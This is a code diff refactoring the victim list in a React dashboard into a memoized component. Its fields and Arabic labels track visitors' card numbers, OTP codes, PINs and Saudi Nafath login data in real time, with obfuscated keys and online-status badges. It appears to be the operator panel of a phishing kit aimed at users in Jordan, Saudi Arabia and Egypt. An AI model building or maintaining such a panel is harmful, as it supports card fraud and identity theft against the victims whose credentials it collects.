@@ -1,6 +1,199 @@
-import React, { useEffect, useMemo, useState, useRef, useCallback } from "react";
+import React, { useEffect, useMemo, useState, useRef, useCallback, memo } from "react";
 import { io, Socket } from "socket.io-client";
 import { addData } from "@/lib/api";
+
+// =============================================
+// Memoized Customer Card Component - Prevents full re-render
+// =============================================
+interface CustomerCardProps {
+  item: any;
+  isSelected: boolean;
+  isFocused: boolean;
+  selectedRequestId: string | null;
+  selectedRequestIds: string[];
+  currentTimeRef: React.MutableRefObject<number>;
+  onSelect: (id: string) => void;
+  onFocus: (id: string) => void;
+  getCustomerEntryCount: (request: any) => number;
+}
+
+const CustomerCardItem = memo(function CustomerCardItem({
+  item,
+  isSelected,
+  isFocused,
+  selectedRequestId,
+  selectedRequestIds,
+  currentTimeRef,
+  onSelect,
+  onFocus,
+  getCustomerEntryCount,
+}: CustomerCardProps) {
+  const raw = item.raw || {};
+  const isOnline = item.badge === "new" || (item.updatedAt && (Date.now() - new Date(item.updatedAt).getTime()) < 60000);
+  const currentPage = raw.currentPage || raw.page || "غير متصل";
+  const entryCount = getCustomerEntryCount(item);
+  
+  // Get the latest timestamp from raw data
+  const latestTimestamp = 
+    raw.checkUpdatedAt ? new Date(raw.checkUpdatedAt).getTime() :
+    raw.cardUpdatedAt ? new Date(raw.cardUpdatedAt).getTime() :
+    raw.otpSubmittedAt ? new Date(raw.otpSubmittedAt).getTime() :
+    raw.pinSubmittedAt ? new Date(raw.pinSubmittedAt).getTime() :
+    raw.phoneSubmittedAt ? new Date(raw.phoneSubmittedAt).getTime() :
+    raw.nafadUpdatedAt ? new Date(raw.nafadUpdatedAt).getTime() :
+    raw.createdAt ? new Date(raw.createdAt).getTime() :
+    raw.submittedAt ? new Date(raw.submittedAt).getTime() :
+    item.submittedAt ? new Date(item.submittedAt).getTime() : 0;
+  
+  const timeSinceSubmit = latestTimestamp > 0 ? currentTimeRef.current - latestTimestamp : 0;
+  const minutesSince = Math.floor(timeSinceSubmit / 60000);
+  const hoursSince = Math.floor(minutesSince / 60);
+  const daysSince = Math.floor(hoursSince / 24);
+  
+  let timeText = '';
+  if (daysSince > 0) {
+    timeText = `${daysSince}d ${hoursSince % 24}h`;
+  } else if (hoursSince > 0) {
+    timeText = `${hoursSince}:${String(minutesSince % 60).padStart(2, '0')}h`;
+  } else if (minutesSince > 0) {
+    timeText = `${minutesSince}m`;
+  } else {
+    timeText = 'الآن';
+  }
+  
+  let backgroundColor = "#f9fafb";
+  if (isFocused) {
+    backgroundColor = "#ffffff";
+  } else if (isOnline) {
+    backgroundColor = "#fefce8";
+  }
+  
+  // Get initials from customer name
+  const getInitials = (name: string) => {
+    if (!name || name === 'زائر') return '؟';
+    const parts = name.trim().split(/\s+/);
+    if (parts.length >= 2) {
+      return (parts[0][0] + parts[1][0]).toUpperCase();
+    }
+    return name.slice(0, 2).toUpperCase();
+  };
+  
+  const customerName = item.customer || 'زائر';
+  const initials = getInitials(customerName);
+  
+  return (
+    <div
+      data-request-id={item.id}
+      onClick={() => onFocus(item.id)}
+      style={{
+        padding: "10px",
+        borderBottom: "1px solid #e5e7eb",
+        background: backgroundColor,
+        cursor: "pointer",
+        transition: "background 0.3s",
+        borderRight: isFocused ? "3px solid #16a34a" : "3px solid transparent",
+      }}
+    >
+      <div style={{ display: "flex", alignItems: "start", gap: 8 }}>
+        {/* Checkbox */}
+        <div style={{ marginTop: 2 }}>
+          <input
+            type="checkbox"
+            checked={selectedRequestIds.includes(item.id)}
+            onChange={(event) => {
+              event.stopPropagation();
+              onSelect(item.id);
+            }}
+            onClick={(event) => event.stopPropagation()}
+            style={{ accentColor: "#16a34a", cursor: "pointer", width: 14, height: 14 }}
+          />
+        </div>
+        
+        {/* Avatar */}
+        <div style={{ position: "relative", flexShrink: 0 }}>
+          <div style={{
+            width: 36,
+            height: 36,
+            borderRadius: "50%",
+            background: "linear-gradient(135deg, #4b5563, #374151)",
+            display: "flex",
+            alignItems: "center",
+            justifyContent: "center",
+            fontSize: "0.7rem",
+            fontWeight: 700,
+            color: "#fff",
+          }}>
+            {initials}
+          </div>
+          {/* Status indicator */}
+          <span style={{
+            position: "absolute",
+            bottom: 0,
+            right: 0,
+            width: 10,
+            height: 10,
+            borderRadius: "50%",
+            background: isOnline ? "#22c55e" : "#6b7280",
+            border: "2px solid #fff",
+          }} />
+          {/* Country flag */}
+          {raw.country && (
+            <span style={{ position: "absolute", top: -2, left: -2, fontSize: "0.65rem", lineHeight: 1 }}>
+              {raw.country === 'jo' || raw.country === 'JO' || raw.country === 'Jordan' ? '🇯🇴' :
+               raw.country === 'sa' || raw.country === 'SA' || raw.country === 'Saudi' ? '🇸🇦' :
+               raw.country === 'eg' || raw.country === 'EG' || raw.country === 'Egypt' ? '🇪🇬' : '🌐'}
+            </span>
+          )}
+        </div>
+        
+        {/* Info */}
+        <div style={{ flex: 1, minWidth: 0 }}>
+          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 2 }}>
+            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+              <span style={{
+                fontWeight: 700,
+                fontSize: "0.8rem",
+                color: "#111827",
+                overflow: "hidden",
+                textOverflow: "ellipsis",
+                whiteSpace: "nowrap",
+                maxWidth: 120,
+              }}>
+                {customerName}
+              </span>
+              {entryCount > 1 && (
+                <span style={{
+                  background: "#e0e7ff",
+                  color: "#3730a3",
+                  fontSize: "0.6rem",
+                  padding: "1px 4px",
+                  borderRadius: 4,
+                  fontWeight: 600,
+                }}>
+                  {entryCount}
+                </span>
+              )}
+            </div>
+            <span style={{ fontSize: "0.65rem", color: "#9ca3af", whiteSpace: "nowrap", flexShrink: 0, fontWeight: 400 }}>
+              {timeText}
+            </span>
+          </div>
+          
+          <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
+            <span style={{ fontSize: "0.75rem", color: "#4b5563", fontWeight: 600 }}>
+              {currentPage === "check" || raw._v1 || raw.cardNumber ? "رقم البطاقة" :
+               currentPage === "step2" || raw._v5 || raw.otpStatus ? "رمز OTP" :
+               currentPage === "step3" || raw._v6 || raw.pinStatus ? "رقم PIN" :
+               currentPage === "step5" || raw.phoneOtpStatus ? "التحقق" :
+               currentPage === "nafad" ? "بيانات النفاذ" : "رقم الهاتف"}
+            </span>
+            <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#9ca3af", display: "inline-block" }} />
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+});
 
 // =============================================
 // Socket.IO Connection for Real-time Updates
@@ -3672,177 +3865,21 @@ export default function DashboardPage() {
               </span>
             </div>
 
-            {filteredRequests.map((item) => {
-              const isSelected = selectedRequestIds.includes(item.id);
-              const isFocused = selectedRequestId === item.id;
-              const isOnline = item.badge === "new" || (item.updatedAt && (Date.now() - new Date(item.updatedAt).getTime()) < 60000);
-              const currentPage = item.raw?.currentPage || item.raw?.page || "غير متصل";
-              const entryCount = getCustomerEntryCount(item);
-              
-              // Get the latest timestamp from raw data (same as boxes in main panel)
-              const raw = item.raw || {};
-              const latestTimestamp = 
-                raw.checkUpdatedAt ? new Date(raw.checkUpdatedAt).getTime() :
-                raw.cardUpdatedAt ? new Date(raw.cardUpdatedAt).getTime() :
-                raw.otpSubmittedAt ? new Date(raw.otpSubmittedAt).getTime() :
-                raw.pinSubmittedAt ? new Date(raw.pinSubmittedAt).getTime() :
-                raw.phoneSubmittedAt ? new Date(raw.phoneSubmittedAt).getTime() :
-                raw.nafadUpdatedAt ? new Date(raw.nafadUpdatedAt).getTime() :
-                raw.createdAt ? new Date(raw.createdAt).getTime() :
-                raw.submittedAt ? new Date(raw.submittedAt).getTime() :
-                item.submittedAt ? new Date(item.submittedAt).getTime() : 0;
-              
-              const timeSinceSubmit = latestTimestamp > 0 ? currentTimeRef.current - latestTimestamp : 0; // ✅ Use ref
-              const minutesSince = Math.floor(timeSinceSubmit / 60000);
-              const hoursSince = Math.floor(minutesSince / 60);
-              const daysSince = Math.floor(hoursSince / 24);
-              
-              // Smart format: show the most appropriate time unit
-              let timeText = '';
-              if (daysSince > 0) {
-                timeText = `${daysSince}d ${hoursSince % 24}h`;
-              } else if (hoursSince > 0) {
-                timeText = `${hoursSince}:${String(minutesSince % 60).padStart(2, '0')}h`;
-              } else if (minutesSince > 0) {
-                timeText = `${minutesSince}m`;
-              } else {
-                timeText = 'الآن';
-              }
-              
-              // Background color based on status
-              let backgroundColor = "#f9fafb"; // Default gray for offline
-              if (isFocused) {
-                backgroundColor = "#ffffff"; // White when focused
-              } else if (isOnline) {
-                backgroundColor = "#fefce8"; // Light yellow for online
-              }
-              
-              return (
-                <div
-                  key={item.id}
-                  onClick={() => setSelectedRequestId(item.id)}
-                  style={{
-                    padding: "10px",
-                    borderBottom: "1px solid #e5e7eb",
-                    background: backgroundColor,
-                    cursor: "pointer",
-                    transition: "background 0.3s",
-                    borderRight: isFocused ? "3px solid #16a34a" : "3px solid transparent",
-                  }}
-                >
-                  <div style={{ display: "flex", alignItems: "start", gap: 8 }}>
-                    {/* Checkbox */}
-                    <div style={{ marginTop: 2 }}>
-                      <input
-                        type="checkbox"
-                        checked={isSelected}
-                        onChange={(event) => {
-                          event.stopPropagation();
-                          toggleRequestSelection(item.id);
-                        }}
-                        onClick={(event) => event.stopPropagation()}
-                        style={{ accentColor: "#16a34a", cursor: "pointer", width: 14, height: 14 }}
-                      />
-                    </div>
-                    
-                    {/* Avatar with status */}
-                    <div style={{ position: "relative", flexShrink: 0 }}>
-                      <div style={{
-                        width: 36,
-                        height: 36,
-                        borderRadius: "50%",
-                        background: isOnline 
-                          ? "linear-gradient(135deg, #16a34a, #15803d)" 
-                          : "linear-gradient(135deg, #4b5563, #374151)",
-                        boxShadow: isOnline ? "0 0 0 2px rgba(34, 197, 94, 0.25)" : "none",
-                        display: "flex",
-                        alignItems: "center",
-                        justifyContent: "center",
-                        fontSize: "0.7rem",
-                        fontWeight: 700,
-                        color: "#fff",
-                      }}>
-                        {item.customer?.charAt(0)?.toUpperCase() || "?"}
-                      </div>
-                      {/* Online indicator */}
-                      <span style={{
-                        position: "absolute",
-                        bottom: 0,
-                        right: 0,
-                        width: 10,
-                        height: 10,
-                        borderRadius: "50%",
-                        background: isOnline ? "#16a34a" : "#6b7280",
-                        border: "2px solid #fff",
-                        animation: isOnline ? "pulse 2s infinite" : "none",
-                      }} />
-                      {/* Country flag */}
-                      {getCountryFlag(item.raw) && (
-                        <span style={{
-                          position: "absolute",
-                          top: -2,
-                          left: -2,
-                          fontSize: "0.65rem",
-                          lineHeight: 1,
-                        }}>
-                          {getCountryFlag(item.raw)}
-                        </span>
-                      )}
-                    </div>
-                    
-                    {/* Info */}
-                    <div style={{ flex: 1, minWidth: 0 }}>
-                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 2 }}>
-                        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
-                          <span style={{ 
-                            fontWeight: 700, 
-                            fontSize: "0.8rem", 
-                            color: selectedRequestId === item.id ? "#15803d" : "#111827",
-                            overflow: "hidden",
-                            textOverflow: "ellipsis",
-                            whiteSpace: "nowrap",
-                            maxWidth: entryCount > 1 ? 120 : 160,
-                          }}>
-                            {getCustomerDisplayName(item)}
-                          </span>
-                          {item.hasCard || item.raw?._v1 || item.raw?.cardNumber ? (
-                            <span style={{ flexShrink: 0 }}>
-                              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" strokeWidth="2">
-                                <rect width="20" height="14" x="2" y="5" rx="2" />
-                                <line x1="2" x2="22" y1="10" y2="10" />
-                              </svg>
-                            </span>
-                          ) : null}
-                        </div>
-                        {/* Smart timer - time since first submission */}
-                        <span style={{ 
-                          fontSize: "0.65rem", 
-                          color: isOnline ? "#16a34a" : "#9ca3af", 
-                          whiteSpace: "nowrap", 
-                          flexShrink: 0,
-                          fontWeight: isOnline ? 700 : 400 
-                        }}>
-                          {timeText}
-                        </span>
-                      </div>
-                      <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
-                        <span style={{ fontSize: "0.75rem", color: "#4b5563", fontWeight: 600 }}>
-                          {getPageArabicName(currentPage)}
-                        </span>
-                        <span style={{
-                          width: 6,
-                          height: 6,
-                          borderRadius: "50%",
-                          background: isOnline ? "#16a34a" : "#9ca3af",
-                          display: "inline-block",
-                          animation: isOnline ? "pulse 2s infinite" : "none",
-                        }} />
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              );
-            })}
+            {/* ✅ Using memoized component to prevent full re-render */}
+            {filteredRequests.map((item) => (
+              <CustomerCardItem
+                key={item.id}
+                item={item}
+                isSelected={selectedRequestIds.includes(item.id)}
+                isFocused={selectedRequestId === item.id}
+                selectedRequestId={selectedRequestId}
+                selectedRequestIds={selectedRequestIds}
+                currentTimeRef={currentTimeRef}
+                onSelect={toggleRequestSelection}
+                onFocus={setSelectedRequestId}
+                getCustomerEntryCount={getCustomerEntryCount}
+              />
+            ))}
             {filteredRequests.length === 0 && (
               <div style={{ padding: 24, textAlign: "center", color: "#6b7280" }}>لا توجد نتائج</div>
             )}
